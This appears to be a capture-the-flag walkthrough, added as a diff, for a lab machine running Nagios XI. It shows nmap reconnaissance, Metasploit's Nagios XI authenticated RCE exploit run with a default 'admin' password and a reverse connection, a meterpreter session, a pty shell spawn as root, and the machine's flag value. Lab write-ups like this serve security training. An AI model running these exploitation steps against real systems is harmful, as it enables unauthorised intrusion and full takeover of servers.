@@ -1,0 +1,119 @@
+1. Recon 
+ Tool nmap 
+  nmap -A $Ip
+Output:
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-17 12:37 IST
+Warning: 192.168.246.136 giving up on port because retransmission cap hit (2).
+Nmap scan report for 192.168.246.136
+Host is up (0.22s latency).
+Not shown: 987 closed ports
+PORT      STATE    SERVICE          VERSION
+22/tcp    open     ssh              OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b8:8c:40:f6:5f:2a:8b:f7:92:a8:81:4b:bb:59:6d:02 (RSA)
+|   256 e7:bb:11:c1:2e:cd:39:91:68:4e:aa:01:f6:de:e6:19 (ECDSA)
+|_  256 0f:8e:28:a7:b7:1d:60:bf:a6:2b:dd:a3:6d:d1:4e:a4 (ED25519)
+25/tcp    open     smtp             Postfix smtpd
+|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2020-09-08T17:59:00
+|_Not valid after:  2030-09-06T17:59:00
+|_ssl-date: TLS randomness does not represent time
+80/tcp    open     http             Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Nagios XI
+389/tcp   open     ldap             OpenLDAP 2.2.X - 2.3.X
+443/tcp   open     ssl/http         Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Nagios XI
+| ssl-cert: Subject: commonName=192.168.1.6/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
+| Not valid before: 2020-09-08T18:28:08
+|_Not valid after:  2030-09-06T18:28:08
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+1056/tcp  filtered vfo
+1141/tcp  filtered mxomss
+2046/tcp  filtered sdfunc
+2393/tcp  filtered ms-olap1
+2607/tcp  filtered connection
+3476/tcp  filtered nppmp
+10000/tcp filtered snet-sensor-mgmt
+32781/tcp filtered unknown
+Service Info: Host:  ubuntu; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 60.75 seconds
+                                                             
+
+Web crawling
+Tool : dirb
+
+No need 
+Searched in web
+We found login page
+
+Gathering details about nagios in metasploit/exploiting code
+command : msfconsole
+msf6 > search nagios
+
+Matching Modules
+================
+
+   #  Name                                                          Disclosure Date  Rank       Check  Description
+   -  ----                                                          ---------------  ----       -----  -----------
+   0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution
+   1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution
+   2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution
+   3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution
+   4  exploit/linux/misc/nagios_nrpe_arguments                      2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution
+   5  exploit/unix/webapp/nagios3_history_cgi                       2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution
+   6  exploit/unix/webapp/nagios3_statuswml_ping                    2009-06-22       excellent  No     Nagios3 statuswml.cgi Ping Command Execution
+   7  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection
+   8  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration
+
+
+Interact with a module by name or index. For example info 8, use 8 or use post/linux/gather/enum_nagios_xi
+
+msf6 > 
+
+Let's try Latest attack
+we'll try exploit/linux/http/nagios_xi_authenticated_rce
+
+msf6 exploit(linux/http/nagios_xi_authenticated_rce) > set password admin
+password => admin
+msf6 exploit(linux/http/nagios_xi_authenticated_rce) > set rhost 192.168.246.136
+rhost => 192.168.246.136
+msf6 exploit(linux/http/nagios_xi_authenticated_rce) > set lhost tun0
+lhost => $IP
+
+We are now into target after running above exploit
+meterpreter > localtime
+Local Date/Time: 2021-07-17 00:32:11 PDT (UTC-0700)
+meterpreter > sysinfo
+Computer     : 192.168.246.136
+OS           : Ubuntu 16.04 (Linux 4.4.0-186-generic)
+Architecture : x64
+BuildTuple   : x86_64-linux-musl
+Meterpreter  : x64/linux
+meterpreter > shell
+Process 13724 created.
+Channel 1 created.
+
+2. Shell spawning
+ command python -c 'import pty ; pty.spawn("/bin/bash");'
+root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# 
+
+We are into root already so no need for privelige escalation
+root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# 
+
+Searching for flag
+
+root@ubuntu:~# cat proof.txt
+cat proof.txt
+a3255f270363c967c6a7767beaf37050
+
+
+<Machine Solved>
+
+
